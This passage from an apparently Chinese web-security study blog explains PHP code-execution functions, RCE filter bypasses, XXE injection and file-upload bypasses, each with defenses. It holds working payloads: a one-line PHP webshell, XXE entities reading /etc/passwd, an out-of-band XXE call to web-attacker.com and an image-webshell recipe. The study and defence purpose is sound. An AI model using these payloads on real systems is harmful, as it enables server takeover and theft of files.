class="headerlink" title="代码执行函数"></a>代码执行函数</h5><blockquote><ul><li><p><code>eval()</code>：传入的参数必须是php代码，即需要以分号结尾。例如：<code>cmd=system(whoami)；</code></p></li><li><p><code>assert()</code>：直接将传入的参数当成php代码执行，传入的参数不需要以分号结尾。例如：<code>cmd=system(whoami)</code></p></li><li><p><code>preg_replace()</code>：将目标字符中<code>符合正则规则</code>（自己拟定的）的字符替换为替换字符，此时，如果正则规则中使用<code>/e</code>修饰符，则表示存在代码执行漏洞。例如：<code>preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);</code>表示函数将根据正则表达式模式（参数一），在参数三中寻找到了与模式匹配的字符串并将其替换为参数二提供的字符串。</p></li></ul><p>有关<code>/e</code>修饰符的解释如下：</p><p>也就是说，在执行替换的过程中，替换字符串会被当成代码解释执行</p><p>但受版本限制，仅适用于PHP版本&lt;5.5.0</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721808910747.png"></p><ul><li><p><code>create_function()</code>：创造匿名函数执行代码，执行命令和上传文件参考eval()函数（必须加分号）。例如：<code>$func=create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func();</code>其中，参数一表示函数的参数列表，参数二表示函数体的代码。创建完毕后执行该匿名函数。（$表示变量声明）</p></li><li><p><code>call_user_func()</code>：调用一个回调函数处理字符串。例如：<code>call_user_func(&quot;assert&quot;,$_POST[&#39;cmd&#39;])；</code>其中，参数一是被调用的回调函数，可以是包含函数名的字符串或包含对象引用和方法名的数组。参数二是传递给回调函数的参数，可以有多个，之间使用逗号分隔。</p></li><li><p><code>array_filter()</code>：用回调函数过滤数组中的元素。</p></li></ul></blockquote><h4 id="4、漏洞检测"><a href="#4、漏洞检测" class="headerlink" title="4、漏洞检测"></a>4、漏洞检测</h4><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><blockquote><p>白盒：对代码进行审计</p><p>黑盒：利用漏扫工具、公开的漏洞、手工看功能点及参数值。</p></blockquote><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>整体的检测方式和<strong>命令执行</strong>的是一样的，只是输入的方式不同。</p><h4 id="5、漏洞利用"><a href="#5、漏洞利用" class="headerlink" title="5、漏洞利用"></a>5、漏洞利用</h4><p><a href="https://www.freebuf.com/articles/web/367358.html">RCE代码及命令执行</a></p><p><a href="https://www.freebuf.com/articles/web/395449.html">rce漏洞介绍及其绕过教程</a></p><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCE漏洞详解及绕过总结(全面)-很多绕过示例</a></p><p><a href="https://blog.csdn.net/qq_41315957/article/details/118855865">总结rce（远程代码执行各种sao姿势）绕过bypass</a></p><p><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p><h5 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h5><blockquote><ul><li><strong>空格绕过</strong>：使用<code>$&#123;IFS&#125;</code>、<code>$IFS</code>、<code>+</code>、<code>%09</code>、<code>%0b</code>、<code>$IFS$9</code>、<code>$IFS$1</code>、重定向符<code>&lt;</code>或<code>&lt;&lt;</code>中的一种符合替代空格。例如：cat file – cat&gt;file</li><li><strong>字符绕过</strong>：</li></ul><p>用 \ 绕过：例如 cat -&gt; c\at</p><p>用 &#96; 绕过：例如 cat -&gt; 使用两个单引号将 cat 包围封闭起来</p><p>用 ‘’ 绕过：例如 cat -&gt; c’’at</p><p>用 $ 绕过(字符拼接法)：例如：flag -&gt; a&#x3D;f;$alag（如果过滤了<code>;</code>字符串,可以用<code>%0a,%0d,%0D%0A</code>来代替）</p><p>用base编码绕过</p><p>……还有更多的绕过方法参考上述链接1、2、3、4</p></blockquote><h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 注入一句话木马<br>?txt=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);    <br>// 获取当前绝对路径<br>?txt=<span class="hljs-built_in">print</span>(_FILE_);      <br>// 读取重要文件<br>?txt=var_dump(file_get_contents(<span class="hljs-string">&#x27;c:\\windows\system32\drivers\etc\hosts&#x27;</span>));    <br>// 写入shell，Getshell<br>?txt=var_dump(file_put_contents(<span class="hljs-variable">$_POST</span>[1],<span class="hljs-variable">$POST</span>[2]));<br>1=shell.php&amp;2=&lt;?php phpinfo()?&gt;   <br></code></pre></td></tr></table></figure><h4 id="6、漏洞危害"><a href="#6、漏洞危害" class="headerlink" title="6、漏洞危害"></a>6、漏洞危害</h4><ul><li>任意命令执行系统命令</li><li>恶意木马被种植</li><li>挂马、钓鱼</li><li>敏感信息泄露</li><li>继承web服务器权限，读写重要文件</li><li>反弹shell</li><li>继承web服务器程序权限，去执行系统命令</li></ul><h4 id="7、漏洞防御"><a href="#7、漏洞防御" class="headerlink" title="7、漏洞防御"></a>7、漏洞防御</h4><p>1、过滤特殊字符或替换字符</p><p>2、严格验证输入的类型长度</p><p>3、使用escapeshellarg()函数处理相关参数</p><p>4、尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行功能的函数前，要先确定参数内容。</p><p>5、尽量避免使用容易产生漏洞的危险函数</p><p>6、对用户的输入做严格的过滤，如白名单过滤</p><h3 id="⑥XML外部实体注入攻击（XEE）"><a href="#⑥XML外部实体注入攻击（XEE）" class="headerlink" title="⑥XML外部实体注入攻击（XEE）"></a>⑥XML外部实体注入攻击（XEE）</h3><h4 id="1、先验知识-1"><a href="#1、先验知识-1" class="headerlink" title="1、先验知识"></a>1、先验知识</h4><ul><li><h5 id="XML基础简介"><a href="#XML基础简介" class="headerlink" title="XML基础简介"></a>XML基础简介</h5></li></ul><p><code>xml</code>，指可扩展标记语言，是一种很像HTML的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。被设计用来<code>传输和存储数据</code>。</p><p><code>html</code>用于<code>显示数据</code>。</p><ul><li><h5 id="XML文档格式"><a href="#XML文档格式" class="headerlink" title="XML文档格式"></a>XML文档格式</h5></li></ul><p>xml文档格式包含了xml声明、DTD文档类型定义（可选，即XML的布局语言）、文档元素。</p><p>其中：</p><p>· xml声明：是用于XML文档开头的一个语句，用于指定关于文档本身的信息，并非所有XML文档都必须使用。其声明通常为：<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p><p>· DTD文档类型定义：它的作用是定义 XML 文档的合法构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可以在 XML 文档内声明，也可以外部引用。</p><blockquote><ul><li>DTD声明</li></ul><p>内部声明DTD：<!DOCTYPE 根元素 [元素声明]></p><p>引用外部DTD文档：</p><p>~ 当引用的DTD文件是本地文件的时候，用<code>SYSTEM</code>标识。<!DOCTYPE 根元素 SYSTEM "DTD文件路径"></p><p>~ 当引用的DTD文件是一个公共文件的时候，用<code>PUBLIC</code>标识。<!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文件的URL"></p><ul><li>DTD实体（ENTITY）</li></ul><p>是用于定义引用普通文本或特殊字符的快捷方式的变量（标签中的内容）。共有四种实体声明：</p><p>内部实体声明：<!ENTITY 实体名称 "实体的值"></p><p>外部实体声明：<!ENTITY 实体名称 SYSTEM "URI"></p><p>参数实体声明：<!ENTITY % 实体名称 "实体的值">、<!ENTITY % 实体名称 SYSTEM "URI/URL"></p><p>公共实体声明：<!ENTITY 实体名称 PUBLIC "public_ID" "URL"></p><p>调用方式：<code>&amp;实体名称;</code>（注意，参数实体只能被DTD文件自身调用，当然也可以外部引用）</p></blockquote><ul><li><h5 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h5></li></ul><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”</p><ul><li><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!--XML声明--&gt;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br><br>&lt;!--文档类型定义--&gt;<br>&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; <br>    &lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt; <br>    &lt;!ELEMENT to (<span class="hljs-comment">#PODATA)&gt;      &lt;!--定义to元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT from (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义from元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT <span class="hljs-built_in">head</span> (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义head元素为&quot;#PODATA&quot;类型--&gt; </span><br>    &lt;!ELEMENT body (<span class="hljs-comment">#PODATA)&gt;    &lt;!--定义body元素为&quot;#PODATA&quot;类型--&gt;</span><br>]&gt;<br><br>&lt;!--文档元素--&gt;<br>&lt;note&gt;<br>&lt;to&gt;Tove&lt;/to&gt;<br>&lt;from&gt;Jani&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Don<span class="hljs-string">&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="hljs-string">&lt;/note&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2、漏洞简介"><a href="#2、漏洞简介" class="headerlink" title="2、漏洞简介"></a>2、漏洞简介</h4><p>· XML 外部实体注入漏洞（XML External Entity Injection）简称XXE。</p><p>· XXE漏洞发生在应用程序解析XML输入时，由于没有禁止外部实体的加载，导致可加载恶意外部文件，造成任意文件读取、命令执行、内网探测和攻击、引起dos攻击等危害。</p><p>· XML外部实体注入攻击漏洞是在对<code>非安全的外部实体数据</code>进行处理时引发的安全问题，触发的点往往是<code>可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件</code>，造成攻击危害。</p><h4 id="3、漏洞原理"><a href="#3、漏洞原理" class="headerlink" title="3、漏洞原理"></a>3、漏洞原理</h4><blockquote><p>服务端接收并解析了来自用户端的xml数据,并且没有做严格的安全控制,从而导致xml外部实体注入。</p></blockquote><p>更细致地说：</p><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的实体中，只要我们在XML中让前面的实体的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。</p><p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。</p><p>另外，一般来说，服务器解析XML有两种方式：一种是<code>一次性将整个XML加载进内存中，进行解析</code>；另一种是<code>一部分一部分的、“流式”地加载、解析</code>。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击（Dos）。</p><h4 id="4、XXE攻击类型"><a href="#4、XXE攻击类型" class="headerlink" title="4、XXE攻击类型"></a>4、XXE攻击类型</h4><blockquote><p>主要有四种XXE攻击类型：</p><ul><li>利用XXE获取文件内容</li><li>利用XXE发动SSRF攻击</li><li>利用XXE盲打获取带外（OAST）数据</li><li>利用XXE盲打，通过报错信息获取数据</li></ul><p>其实上面这四个分类是有点泛的说法。依照实际情况来说呢，XXE的漏洞利用主要有：</p><p>任意文件读取（有回显、无回显）、探测SQL盲注、探测内网地址&#x2F;端口、攻击内网网站、执行系统命令、netdoc协议读取文件、Dos拒绝服务攻击</p></blockquote><h4 id="5、漏洞发现"><a href="#5、漏洞发现" class="headerlink" title="5、漏洞发现"></a>5、漏洞发现</h4><p><code>寻找XML输入点</code>！</p><ul><li>人工方式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722241085705.png" alt="img"></p><ul><li>工具利用</li></ul><blockquote><p>在线工具：<a href="http://ceye.io/%E3%80%81">http://ceye.io/、</a> <a href="http://www.dnslog.cn/%E3%80%81">http://www.dnslog.cn/、</a> <a href="https://dnslog.io/">https://dnslog.io/</a></p></blockquote><h4 id="6、XEE漏洞利用"><a href="#6、XEE漏洞利用" class="headerlink" title="6、XEE漏洞利用"></a>6、XEE漏洞利用</h4><p><a href="https://blog.csdn.net/weixin_42282667/article/details/123359030">XML实体注入漏洞姿势总结</a></p><p><a href="https://www.freebuf.com/articles/web/374863.html">服务器端漏洞篇之XML外部实体注入(XXE)专题</a></p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html">XML与xxe注入基础知识</a></p><p><a href="https://blog.csdn.net/lady_killer9/article/details/108448865">XXE（XML外部实体注入）原理、攻击及防御</a></p><p><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p><p><a href="https://blog.csdn.net/dreamthe/article/details/121332152">XXE漏洞原理及防御方式。</a></p><p><a href="https://blog.csdn.net/m0_64481831/article/details/136140050">XEE漏洞详解（全面）</a></p><ul><li>利用XXE获取文件内容</li></ul><p>例如：在DTD定义中声明一个外部实体，指定使用file伪协议的文件路径从而获取文件的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt; ]&gt;<br>&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;<br></code></pre></td></tr></table></figure><p>注入的方法是，随机触发并抓取一个POST请求数据包，然后发送到 repeater ，在里面添加上述自定义实体（直接在数据包末尾添加即可），然后发送。</p><ul><li>利用XXE发动SSRF攻击</li></ul><p>这种攻击的原理是：<code>通过XXE诱导服务器访问指定的URL从而发动SSRF攻击</code>，例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt; ]&gt;<br></code></pre></td></tr></table></figure><p>主要就是将外部实体的URL替换为可以获取用户敏感信息的URL。</p><p>构造payload的方式，也就是实现的方式，和上述类似，也是在抓取数据包，在数据包末尾添加自定义的DTD实体然后重放。</p><ul><li>使用带外（OAST）技术探测XXE盲打</li></ul><p><a href="https://xz.aliyun.com/t/9519?time__1311=n4+xnD0DuAeWq0KGQtDsA3xCwjLDgiDxGwxnHID">盲XXE攻击 -带外交互技术(OAST) 泄露数据</a></p><p><a href="https://blog.csdn.net/hamletal/article/details/120487604">带外应用安全测试（OAST）-含义解释</a></p><blockquote><p>OAST带外应用程序安全测试，使用外部服务器查看不可见的漏洞</p><p>盲打：是指黑客或攻击者在未经授权的情况下进行的攻击活动，而攻击者在进行这些活动时没有明确的目标或特定的目标信息。盲打攻击可以是对广泛范围的网络或系统进行扫描和攻击，以寻找可能存在的漏洞或弱点，而非专门针对某个具体的目标进行攻击。</p></blockquote><p>利用XXE发动SSRF攻击，带外技术通过XXE与远端服务器进行交互，从而探测是否存在XXE盲打漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt; ]&gt;<br></code></pre></td></tr></table></figure><p>当中的URL，应该就是外部服务器地址了。</p><p>有些情况下，目标服务器对常规XXE攻击进行了防护，不过我们可以尝试使用<code>XML参数实体</code>，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM <span class="hljs-string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt; %xxe; ]&gt;<br></code></pre></td></tr></table></figure><p>通过定义参数实体同样可以用来探测XXE盲打。</p><ul><li>利用XXE盲打，通过报错信息获取数据</li></ul><p>可以通过触发XML解析错误将敏感信息泄漏在报错信息中，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>&lt;!ENTITY % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;<br>%<span class="hljs-built_in">eval</span>;<br>%error;<br></code></pre></td></tr></table></figure><p>一般来说，能看到加载了一个不存在的文件触发XML报错，但是后面加载的file实体指定的文件是存在的，所以XML报错信息中就能泄漏这个文件的内容了。</p><p>然后其它的利用方式可以参考上述的链接，有些小众的利用方式未必会成功。</p><h4 id="7、漏洞防御-1"><a href="#7、漏洞防御-1" class="headerlink" title="7、漏洞防御"></a>7、漏洞防御</h4><ul><li>使用开发语言提供的禁用外部实体的方法</li></ul><blockquote><p>php：</p><p>libxml_disable_entity_loader(true);</p><p>Java：</p><p>DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);</p><p>Python：</p><p>from lxml import etree<br>xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</p></blockquote><ul><li>过滤用户提交的XML数据</li></ul><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者是 SYSTEM和PUBLIC</p><ul><li>不允许XML中含有自定义的DTD</li></ul><h3 id="⑦文件上传漏洞"><a href="#⑦文件上传漏洞" class="headerlink" title="⑦文件上传漏洞"></a>⑦文件上传漏洞</h3><h4 id="1、漏洞简介-4"><a href="#1、漏洞简介-4" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>文件上传是现代互联网常见的功能。允许用户上传图片、视频、及其他类型文件，向用户提供的功能越多，web受攻击的风险越大。上传文件时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本文件。</p><p><strong>文件上传漏洞</strong>是指由于网站开发人员没有对用户的文件上传部分做严格限制，导致攻击者可以绕过其本身权限向服务器上传可执行的动态脚本文件。</p><p>比如，<code>对文件上传路径变量过滤不严</code>，<code>对用户上传的文件后缀以及文件类型限制不严</code>，则攻击者可以通过Web访问的目录<code>上传任意文件</code>，包括<code>网站后门文件</code>、<code>动态脚本执行文件</code>等（木马、病毒、webshell），并能将这些文件传递给解释器，从而实现<code>远程控制网站服务器</code>的效果。</p><h4 id="2、漏洞原理"><a href="#2、漏洞原理" class="headerlink" title="2、漏洞原理"></a>2、漏洞原理</h4><p>目标网站：</p><p>· 对文件上传路径变量过滤不严</p><p>· 对用户上传的文件后缀限制不严</p><p>· 对用户上传的文件类型（MIMETYPE）限制不严</p><p>· 权限上没有对上传的文件目录设置不可执行权限（尤其是hashbang类型文件）</p><p>· web服务器端没有对上传文件或指定目录的行为做限制</p><p>· web端系统并未对网站的文件上传行为进行检测或检测的逻辑不够严谨</p><blockquote><p>hashbang，也称为“shebang”，是指脚本文件中第一行中出现的特殊标记，它用于指定该脚本应该由哪个解释器来执行。这一标记通常由字符<code>#!</code>组成，后跟解释器路径。</p><p>例如：<code>\#!/bin/bash</code>表示使用Bash解释器，或者是<code>\#!/usr/bin/env python3</code>表示使用python3解释器</p></blockquote><h4 id="3、漏洞检测"><a href="#3、漏洞检测" class="headerlink" title="3、漏洞检测"></a>3、漏洞检测</h4><blockquote><ul><li>前端js检测：</li></ul><p>绕过方法：禁用javascript；修改前端代码，添加需要上传的脚本语言扩展名；burpsuite抓包修改filename参数。</p><ul><li>后端检测文件类型</li></ul><p>~检测<code>content-type</code>：</p><p>​检测原理：后端获取http请求包的Content-Type参数，判断上传文件类型</p><p>​绕过方法：抓包将</p></blockquote><h4 id="4、漏洞利用"><a href="#4、漏洞利用" class="headerlink" title="4、漏洞利用"></a>4、漏洞利用</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>Web服务器要开启文件上传功能，并且上传api（接口）对外“开放” (Web 用户可以访问）;</p><p>Web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web目录都有执行权限。</p><p>要想完美利用文件上传漏洞，就要上传的文件可以执行，也就是Web容器可以解析我们上传的脚本，无论脚本以什么样的形式存在。</p></blockquote><h5 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h5><ul><li>判断上传漏洞点</li><li>获得文件上传的URL</li><li>检测防御类型</li></ul><h4 id="5、文件上传漏洞绕过"><a href="#5、文件上传漏洞绕过" class="headerlink" title="5、文件上传漏洞绕过"></a>5、文件上传漏洞绕过</h4><ul><li><h5 id="客户端检测与绕过（JS检测绕过）"><a href="#客户端检测与绕过（JS检测绕过）" class="headerlink" title="客户端检测与绕过（JS检测绕过）"></a>客户端检测与绕过（JS检测绕过）</h5></li></ul><p>客户端（Client）：常称为用户端（前端），与服务器相对应。由于客户端对于文件上传漏洞的防御是通过JS代码实现的，所以客户端检测绕过也成为JS检测绕过。</p><blockquote><p>检测原理：调用JS的selectFile()函数，先将文件名转换为小写，然后通过substr()获取文件名最后一个点号后面的后缀（包括点号）进行判断。</p><p>绕过方法：由于后端PHP代码没有对文件做任何检测，所以只要绕过前端JS的校验就可以上传webshell。绕过前端JS校验的方法有二：</p><p>· 删除浏览器事件（把action标签中“return selectFile()”删除）</p><p>· 利用Burpsuite抓包修改文件后缀（比如将后缀修改为php）</p></blockquote><ul><li><h5 id="服务端检测与绕过"><a href="#服务端检测与绕过" class="headerlink" title="服务端检测与绕过"></a>服务端检测与绕过</h5></li><li><p>后缀名检测与绕过</p></li></ul><blockquote><p>检测原理：通过函数phpinfo()获取文件后缀，然后判断其是不是“php”</p><p>绕过方法：</p><p>··· 黑名单：（只针对黑名单中没有的后缀名，文件上传才能成功）</p><p>· 大小写绕过（如写成PHp）</p><p>· 特殊扩展名绕过，比如php可以用php3、php4、php5代替</p><p>· 名单列表绕过（指黑名单之外的后缀名）</p><p>· windows特性（一些特殊的文件名命名方式在win下是不被允许的，利用Burpsuite抓包修改后缀名，绕过验证后上传文件，windows会自动去掉后面添加的，但这特性是win特有的，Unix&#x2F;Linux没有这个特性）：</p><p>对应windows特性的绕过方法一是<code>点绕过</code>，win下文件后缀名最后一个点会被自动去除，而Linux系统下不会。因此可以利用burpsuite工具拦截http请求，上传文件后缀名，然后＋<code>.</code>绕过上传（例如：<code>demo.php.</code>）。</p><p>对应windows特性的绕过方法二是<code>::$DATA绕过</code>，win下，如果上传的文件名为<code>a.php::$DATA</code>，那么它会在服务器上生成一个<code>a.php</code>文件，其中内容和所上传内容相同，且会被解析。场景利用也是通过拦截请求然后修改数据包，在对应的文件后缀处添加<code>::$DATA</code>（注意！win下无法直接测试::$DATA，因为win不允许后缀名中存在特殊字符）</p><p>· <code>.htaccess</code>文件攻击（前提是apache开启.htaccess文件功能）：</p><p>.htaccess是apache服务器中的分布式配置文件（IIS中不存在该文件），该配置文件会覆盖apache服务器的全局配置，作用于当前目录及其子目录。如果一个web应用允许上传.htaccess文件，那意味着攻击者可以更改apache的配置，很危险。在httpd.conf配置文件中，AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件;如果设置为All,那么所有在.htaccess文件里有的指令都将被重写，即允许.htaccess 文件覆盖掉Apache的配置。将内容符合php语法规则的文件当作PHP文件解析，<code>&lt;Directory /&gt; AllowOverride All &lt;/Directory&gt;</code></p><p>··· 白名单：</p><p><code>白名单绕过需要配合文件包含漏洞或解析漏洞，%00截断</code>，而且，只针对白名单中有的后缀名，文件才能上传成功。</p></blockquote><ul><li>MIME类型检测与绕过</li></ul><p>MIME是描述消息内容类型的因特网标准，MIME消息能包含文本、图像、音频、视频以及其它应用程序专用的数据。</p><blockquote><p>常见的MIME类型如下：</p><p>文件扩展名MIME-type</p><p>.jsapplication&#x2F;x-javascript</p><p>.html text&#x2F;html</p><p>.jpg   image&#x2F;jpeg</p><p>.png  image&#x2F;png</p><p>.pdf   application&#x2F;pdf</p></blockquote><blockquote><p>检测原理：判断<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>是不是图片格式，不是则不允许上传。在http协议中，使用<code>Content-Type</code>字段表示文件的MIME类型，<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>的值是从请求数据包中的<code>Content-Type</code>中获取的。</p><p>绕过方法：通过抓取数据包，上传php文件（同样也是在数据包后面追加php代码），Content-Type的值是application&#x2F;octer-stream，上传jpg格式的文件时，Content-Type的值是 image&#x2F;jpeg。因此可以修改文件类型进行绕过。</p></blockquote><ul><li>文件内容检测与绕过</li></ul><blockquote><p>检测原理：利用getimagesize()函数获取图片的宽高等信息，如果上传的不是图片，则获取不到信息。</p><p>绕过方法：在脚本文件开头补充图片对应的头部值，或者在图片后写入脚本代码</p><p>···制作图片马：</p><p>· 在图片后写入脚本文件</p><p>· copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg（参数<code>/b</code>指定以二进制格式复制、合并文件，用于图像类&#x2F;声音类文件；参数<code>/a</code>指定以ASCII码格式复制、合并文件，用于txt等文档类文件）</p></blockquote><ul><li>00截断检测与绕过</li></ul><blockquote><p>检测原理：截断漏洞出现的核心就是<code>chr(0)</code>，这个字符不为空（null），也不是空字符（“”），更不是空格。当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。由于00 代表结束符，PHP会把00后面的所有字符删除。</p><p>截断条件：PHP版本小于5.3.4、 magic_quotes_gpc为OFF状态</p><p>注意：GET型可以对<code>%00</code>自动解码，但POST型不能，需要在二进制中修改</p><p>如果目标存在文件包含漏洞的话，那可以先上传图片马再通过文件包含漏洞来拿shell</p></blockquote><ul><li>条件竞争</li></ul><blockquote><p>一些网站文件检测逻辑是先允许上传任意文件，然后检查文件内容是否包含可执行脚本，如果包含则删除。这里使用sleep() 函数来模拟判断是否含有脚本所需要的时间。</p><p>绕过方法：利用<code>成功上传</code>到<code>删除文件</code>的时间差，上传一个.php文件，在未删除之前立即访问，则会自动生成一个新php文件，新文件不会被删除。</p></blockquote><h4 id="6、配合文件解析漏洞"><a href="#6、配合文件解析漏洞" class="headerlink" title="6、配合文件解析漏洞"></a>6、配合文件解析漏洞</h4><h5 id="什么是文件解析"><a href="#什么是文件解析" class="headerlink" title="什么是文件解析"></a>什么是文件解析</h5><p>当服务器接收到一个Http请求的时候，服务器首先需要决定如何去处理这个请求（服务器处理一个.htm页面和一个.aspx页面肯定是不一样)。</p><p>那服务器依据什么去处理呢?</p><p>答：根据文件的后缀名。</p><p>服务器获取所请求的页面(也可以是文件，比如1.jpg）的后缀名以后，接下来会在服务器端寻找可以处理这类后缀名的应用程序，如果服务器找不到可以处理此类文件的应用程序，那么服务器将直接把这个文件返还给客户端。</p><h5 id="什么是解析漏洞"><a href="#什么是解析漏洞" class="headerlink" title="什么是解析漏洞"></a>什么是解析漏洞</h5><p>解析漏洞是指服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由<code>应用程序本身的漏洞</code>导致的。</p><h5 id="常见的解析漏洞"><a href="#常见的解析漏洞" class="headerlink" title="常见的解析漏洞"></a>常见的解析漏洞</h5><ul><li><strong>IIS 5.x&#x2F;IIS 6.0解析漏洞</strong></li></ul><p>在IIS 5.x&#x2F;IIS 